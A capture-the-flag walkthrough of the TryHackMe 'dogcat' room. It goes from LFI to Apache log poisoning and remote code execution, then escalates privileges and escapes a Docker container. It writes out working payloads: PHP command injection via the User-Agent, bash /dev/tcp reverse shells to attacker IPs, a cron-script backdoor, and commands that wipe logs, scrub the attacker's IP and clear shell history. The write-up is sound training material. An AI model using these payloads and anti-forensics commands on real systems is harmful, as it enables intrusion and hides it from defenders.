---
title: "dogcat"
subtitle: "CTF room: https://tryhackme.com/room/dogcat"
category: CTF, Medium
tags: ctf,nmap,gobuster,dirbuster,session,broken-authentication,javascript,apache,ubuntu,john,gpg2john,linpeas,privesc,cron
refactor: true
panel_includes:
  - toc
---
# dogcat

URL: <https://tryhackme.com/room/dogcat> &nbsp;<span class="badge rounded-pill bg-warning text-dark" title="This is a Medium difficulty room."><i class="fa fa-wrench"></i>&nbsp;Medium</span>

## PHASE 1: Reconnaissance

Description of the room:

> I made this website for viewing cat and dog images with PHP. If you're feeling down, come look at some dogs/cats!

## PHASE 2: Scanning & Enumeration

### Running: `nmap`

Ran the following:

> `nmap -sCV x.x.x.x`

Interesting ports found to be open:

```python
PORT   STATE SERVICE REASON
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)
|   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)
|_  256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: dogcat
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Also see: [nmap.log](nmap.log)

### Running: `gobuster`

Ran the following:

> `gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://x.x.x.x`

Interesting folders found:

```python
/cats                 (Status: 301) [Size: 311] [--> http://10.10.86.152/cats/]
/dogs                 (Status: 301) [Size: 311] [--> http://10.10.86.152/dogs/]
/server-status        (Status: 403) [Size: 277]
```

Also see: [gobuster.log](gobuster.log)

### Running: `nikto`

Ran the following:

> `nikto -h x.x.x.x`

Interesting info found:

```python
+ Server: Apache/2.4.38 (Debian)
+ /: Retrieved x-powered-by header: PHP/7.4.3.
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.38 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
```

Also see: [nikto.log](nikto.log)

### Exploration

What we find is a website that lets us see random pictures of dogs or cats. It's a PHP site. The URL is little bit telling too:

> `/?view=dog`

This is interesting because whenever the application is relying on US to provide it information about what to view, there is often the possibility that we can trick the application.

#### Local File Inclusion (LFI)

Right off the bat, that "view" of "dog", could mean that "dog" is a folder or file name. If that's the case, then I wonder if we could point to different directories or files? If we can "inject" PHP code, we can try to see if we can view the contents of the files used for this site using the PHP "read" filter. Example:

> `/?view=php://filter/read=convert.base64-encode/resource=./dog/../index`

We include `dog` because there seems to be a check for the word "dog" or "cat", and then we can guess that there is an "default document" of index.php, index.html, etc. Doing this, outputs the contents of the index file, base64-encoded. So, you can quickly base64-decode it using any one of:

1. Base64decode.org - [https://www.base64decode.org/](https://www.base64decode.org/)
2. CyberChef - [https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)
3. CLI with - `echo "<bas64 string here>" | base64 -d`

That decodes to a readable PHP files. This shows us how this main page works:

```php
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A
                cat</button></a><br>
        <?php
        function containsStr($str, $substr)
        {
            return strpos($str, $substr) !== false;
        }
        $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
        if (isset($_GET['view'])) {
            if (containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                echo 'Here you go!';
                include $_GET['view'] . $ext;
            } else {
                echo 'Sorry, only dogs or cats are allowed.';
            }
        }
        ?>
    </div>
</body>

</html>
```

Some of the key takeaways from that PHP code:

1. If there is no `ext` query string argument, it will append a `.php` to the file name.
2. If the `view` query string argument does not include "dog" or "cat", it will give you an error.
3. If the `view` query string argument DOES include "dog" or "cat", it is going to output the contents of the "filename" specified in `view` and concatenate the file extension (either the default `.php`, or whatever you specify in the `ext` query string parameter)

Knowing this, it looks like we can use **Local File Inclusion (LFI)** to read files. We just have to include "dog" or "cat" in the path, and we likely need to specify an empty string for the file extension `ext` query string argument.

A common test would be to go to a known file, which also happens to have interesting information: `/etc/passwd`. We can try several of these to see if this app is susceptible to LFI with attempts like:

```text
/?view=./dog/../etc/passwd&ext
/?view=./dog/../../etc/passwd&ext
/?view=./dog/../../../etc/passwd&ext
/?view=./dog/../../../../etc/passwd&ext  ** This works!
```

To break that apart, what we're saying is:

1. `./` starting from the current folder
2. `dog` go into the dog subfolder (because we have to have "dog" or "cat" be part of the path)
3. Presumably, we are in the `/var/www/html/dog/` folder now
4. `../../../../` go up from `dog`, then up from `html`, then up from `www`, then up from `var` - which should bring us to the root of the file system: `/`
5. `etc/passwd` the actual file we want to view
6. `&ext` the `&` is how you separate query string variables (e.g. `first=john&last=doe&age=30`), and just having `ext` present will tell PHP that we used the `ext` query string variable, which prevents PHP from defaulting to adding a `.php` file extension. Without this `ext`, we'd be attempt to read: `/etc/passwd.php` - which is not a real file.

> **TIP:** Since `nmap` told us this is running an Apache web server, we might guess we're in `/var/www/html/` since that is the default location for a website. So, you might start with at least `../../../` to get to the root of the file system.
{: .prompt-tip }

#### Log Injection / Log Poisoning

If we can use LFI to read files, and if we know this server is running Apache, there is another thing we know:

Apache has a `/var/log/apache2/access.log` where it writes down every visit to the website. The default format is typically:

```log
127.0.0.1 - Scott [11/Dec/2023:13:55:36 -0700] "GET /server-status HTTP/1.1" 200 2326
```

But it's quite common to include the `User-Agent` in the log too, typically at the end. The `User-Agent` is just something a web browser or any kind of web client sends to the server, to tell the server about the client, in case it helps in serving better content. An example of what a typical web browser `User-Agent` looks like:

```text
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
```

We can verify if Apache is configured to include the `User-Agent` by viewing the access log, using our new-found LFI capabilities:

```text
/?view=./dog/../../../../var/log/apache2/access.log&ext
```

And yes, we can confirm that the `User-Agent` is being written to the log. For example:

```log
10.6.90.119 - - [27/Sep/2023:11:12:49 +0000] "GET /dogs/8.jpg HTTP/1.1" 200 52967 "http://10.10.251.122/?view=dog" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"
```

**Putting this all together**, that means that we should be able to set our `User-Agent` to some PHP code. If there is not any "input validation", then we could have this PHP page execute our PHP code, and then put the results in this log file, where we are currently seeing the `User-Agent`

## PHASE 3: Gaining Access & Exploitation

It seems we might have an entry point. We can view files on the server, and we have this potential for **Log Injection** where we could potentially run arbitrary PHP code - AKA **Remote Code Execution (RCE)**.

### Option 1: Executing query string `cmd`, as our `User-Agent`

This kill chain consists of:

1. Set the `User-Agent` to be: `<?php system($_GET['cmd']);?>` (or `exec` or `shell_exec`, etc.)
2. Set a query string argument like: `cmd=ls`

The idea here is that you can URL-encode a command or series of commands in the `cmd` query string parameter, and it will be executed when the Apache server goes to get the `User-Agent` of the caller, incidentally runs our code, and then injects the output (if any) as the `User-Agent` field in the `/var/log/apache2/access.log`

Between special characters (e.g. `'"()$>|`, etc) and then URL-encoding the command (which you can easily do via [CyberChef](https://gchq.github.io/CyberChef/)), something wasn't quite working. I had a difficult time executing complex commands such as echoing out a PHP reverse shell into a file. For example this one-liner reverse shell:

```php
<?php exec("/bin/bash -c 'bash -i > /dev/tcp/10.0.0.10/1234 0>&1'"); ?>
```

Would need to be written to a file on the server (`revshell.php`), and so we need to "escape" the double-quotes, and we now also have a greater-than sign, which is a special character in HTML also:

```bash
echo "<?php exec(\"/bin/bash -c 'bash -i > /dev/tcp/10.0.0.10/1234 0>&1'\"); ?>" > revshell.php
```

So finally, we URL-encode all of that and hope is decodes correctly on the other side:

```urlencoded
echo%20%22%3C?php%20exec(%5C%22/bin/bash%20-c%20'bash%20-i%20%3E%20/dev/tcp/10.0.0.10/1234%200%3E&1'%5C%22);%20?%3E%22%20%3E%20revshell.php
```

Meaning that this URL-encoded string above is what would be passed in the `cmd` query string, making the full URL something like:

```text
/?view=./dog/../../../../var/log/apache2/access.log&ext&cmd=echo%20%22%3C?php%20exec(%5C%22/bin/bash%20-c%20'bash%20-i%20%3E%20/dev/tcp/10.0.0.10/1234%200%3E&1'%5C%22);%20?%3E%22%20%3E%20revshell.php
```

Hopefully you are using some kind of editor (like VSCode) to stage these things, as this can get really messy and confusing to try to construct this live on the command-line. Then, you accidentally hit up-arrow and you lose it all!

Alas, I didn't have much luck with this approach. The answer is probably to escape more of the special characters, but I decided to just move on to another technique.

### Option 2: Directly downloading a reverse shell, as our `User-Agent`

The kill chain on this one is a little more straight-forward. Basically:

1. Run `nc -lvnp 9000` to listen for the reverse shell. Set up your reverse shell file to connect on port 9000.
2. Run `python3 -m http.server 8000` from a folder where you have your reverse shell file.
3. On our web request, modify the `User-Agent` to be something like:

    ```php
    GET /?view=./dog/../../../../var/log/apache2/access.log&ext HTTP/1.1
    Host: 10.10.67.160
    User-Agent: "<?php file_put_contents('revshell.php', file_get_contents('http://10.6.90.119:8000/revshell.php'));?>"
    ```

4. Navigate to `/revshell.php` on the web server and you should get a connection over in netcat.

> **TIP:** This [pentestmonkey Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell) is great. Just set your IP address and listening port, and you can re-use this over and over.
{: .prompt-tip }

### Unprivileged Access

Using Option 2, above, I was able to get a reverse shell as `www-data`. There are several things "weird" about this connection:

1. I can't "upgrade" the shell with Python `pty` or `script`, neither Python nor script are installed. See: [Cheatsheet](/cheatsheet/#concept-upgrading-a-fragile-shell) for more details.
2. Running `hostname` shows the host name as `b2deba11a79a` as opposed to a word-based server name (e.g. `server1`, `dogcat`, etc.
3. It doesn't look like SSH is installed, but `nmap` DID show it as installed?!

What is going on here? Spoiler: **We are running in a container.** More on this in a minute, let's see if we can capture some flags. We run something like this to find any files with the word "flag" in it, and `2>/devnull` means send an errors (`STDERR`) to `/dev/null` (don't show them on the screen):

```bash
find / -name *flag* 2>/dev/null
```

#### Flag 1 of 4

Is located here: `cat /var/www/html/flag.php`

#### Flag 2 of 4

Is located here: `cat /var/www/flag2_QMW7JvaY2LvK.txt`

### Privilege Escalation / Privileged Access

If we run: `sudo -l` we can see we can run `/usr/bin/env`:

```text
User www-data may run the following commands on b2deba11a79a:
    (root) NOPASSWD: /usr/bin/env
```

The `env` command is used to locate programs based on the `PATH` environment variable. This means we can run basically any command. So, we do this:

```bash
sudo -l /usr/bin/env bash
```

And we now have a primitive `root` prompt. Again, since even basic tools are not installed, we can't easily "upgrade" this shell. It's messy but it works.

#### Flag 3 of 4

Is located here: `cat /root/flag3.txt`

#### Flag 4 of 4

We're logged in as `root` in this primitive shell, but we still can't seem to do much, because we're running from within a container.

From snooping around, we find that there is a backup process in `/opt/backups` that appears to work with a folder that is shared between this container and the host (e.g. `/root/container`):

```bash
total 2892
drwxr-xr-x 2 root root    4096 Apr  8  2020 .
drwxr-xr-x 1 root root    4096 Sep 29 07:49 ..
-rwxr--r-- 1 root root     111 Sep 29 08:20 backup.sh
-rw-r--r-- 1 root root 2949120 Sep 29 08:20 backup.tar

```

Inside of that `backup.sh` we have:

```bash
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container
```

We can also tell from the timestamp that this seems to run regularly. So, we might append a reverse shell command to connect back to a *NEW* Netcat instance that is running on port `9001` (remember that our current connection is already using port `9000`):

```bash
echo "bash -i >& /dev/tcp/10.6.90.119/9001 0>&1" >> backup.sh
```

> **TIP:** Remember that `>` creates or overwrites the file. `>>` create or appends to the end of the file.
{: .prompt-tip}

That appends a new line onto that backup script, which now looks like this:

```bash
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container
bash -i >& /dev/tcp/10.6.90.119/9001 0>&1
```

![A few moments later](afewmomentslater.png)

We get a Netcat connection, and it's from the Docker host:

```bash
listening on [any] 9001 ...
connect to [10.6.90.119] from (UNKNOWN) [10.10.67.160] 36038
bash: cannot set terminal process group (3169): Inappropriate ioctl for device
bash: no job control in this shell
root@dogcat:~# 
```

From here, the 4th and final flag is: `cat /root/flag4.txt`.

What's kind of Inception-like is that we can look at the container that we were just in (are STILL in) with something like `docker ps`:

```text
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS                    PORTS                NAMES
b2deba11a79a        box                 "docker-php-entrypoi…"   38 minutes ago      Up 38 minutes (healthy)   0.0.0.0:80->80/tcp   stoic_ptolemy
root@dogcat:~#
```

We can also quickly check to see if there is anything else exposed from this host with: `netstat -tupln` and it looks like it's just SSH and the web server:

```text
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      704/systemd-resolve 
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      878/sshd            
tcp        0      0 127.0.0.1:36449         0.0.0.0:*               LISTEN      828/containerd      
tcp6       0      0 :::22                   :::*                    LISTEN      878/sshd            
tcp6       0      0 :::80                   :::*                    LISTEN      1291/docker-proxy   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           704/systemd-resolve 
udp        0      0 10.10.67.160:68         0.0.0.0:*                           689/systemd-network
```

## PHASE 4: Maintaining Access & Persistence

This is a test/CTF machine, so this is out of scope. However, in a Red Team scenario, we could:

- Add SSH key to `/root/.ssh/authorized_keys`
- Create a privileged account that wouldn’t draw attention (ex: `operations`) or an unprivileged account and give it `sudo` access via group or directly in the `/etc/sudoers` file.
- Install some other backdoor or service.

## PHASE 5: Clearing Tracks

This is a test/CTF machine, so this is out of scope. However, in a Red Team scenario, we could:

### Delete Logs

Delete relevant logs from `/var/log/` - although that might draw attention.

```bash
rm -Rf /var/log/*
```

### Replace our IP

Search and replace our IP address in all logs.

#### OPTION 1: Simple

The simplest way is via something like:

```bash
find /var/log -name "*" -exec sed -i 's/10.10.2.14/127.0.0.1/g' {} \;
```

This searches for all files under `/var/log/` and for each file found, searches for `10.10.2.14` (replace this with your IP) and and replace anywhere that is found with `127.0.0.1`.

#### OPTION 2: Complex

You could come up with your own scheme. For example, you could generate a random IP address with:

```bash
awk -v min=1 -v max=255 'BEGIN{srand(); for(i=1;i<=4;i++){ printf int(min+rand()*(max-min+1)); if(i<4){printf "."}}}'
```

I'd like this to use a new, unique, random IP address for every instance found, but `sed` doesn't support command injection in the search/replace operation. However, you could generate a random IP address to a variable and use that for this search and replace, like below. Note that the `2> /dev/null` hides any error messages of accessing files.

##### As separate statements

In case you want to work out each individual piece of this, here they are as separate statements:

```bash
# MY IP address that I want to scrub.
srcip="22.164.233.238"

# Generate a new, unique, random IP address
rndip=`awk -v min=1 -v max=255 'BEGIN{srand(); for(i=1;i<=4;i++){ printf int(min+rand()*(max-min+1)); if(i<4){printf "."}}}'`

# Find all files and replace any place that you see my IP, with the random one.
find /var/log -name "*" -exec sed -i "s/$srcip/$rndip/g" {} \; 2> /dev/null
```

##### As one ugly command

This is something you could copy/paste, and just change your IP address.

Basically, just set your `srcip` to your workstations' IP first, and MAKE SURE to run this with a space prefixed, so this command doesn't get written to the shell's history files (e.g. `~/.bash_history`, `~/.zsh_history`, etc.)

```bash
 srcip="10.10.10.10" ; find /tmp -name "*" -exec sed -i "s/$srcip/`awk -v min=1 -v max=255 'BEGIN{srand(); for(i=1;i<=4;i++){ printf int(min+rand()*(max-min+1)); if(i<4){printf "."}}}'`/g" {} \; 2>/dev/null
```

or optionally, start a new shell, turn off command history, AND start the command with a space prefixed (which also should not add the command to the shell history), then exit out of that separate process:

```bash
bash
unset HISTFILE
 srcip="10.10.10.10" ; find /tmp -name "*" -exec sed -i "s/$srcip/`awk -v min=1 -v max=255 'BEGIN{srand(); for(i=1;i<=4;i++){ printf int(min+rand()*(max-min+1)); if(i<4){printf "."}}}'`/g" {} \; 2>/dev/null
exit
```

The key idea here is that hiding your address from the logs would be pointless if the *command* for hiding your address from the logs were in a log some place!

### Wipe shell history

For any accounts that we used, if we don't mind that this will destroy valid entries of the user too (and give them an indication their account was compromised), run a comand like this with `tee` writing out nothing/null to multiple files at once:

```bash
cat /dev/null | tee /root/.bash_history /home/kathy/.bash_history /home/sam/.bash_history
```

## Summary

Completed: [2023-09-29 05:13:24]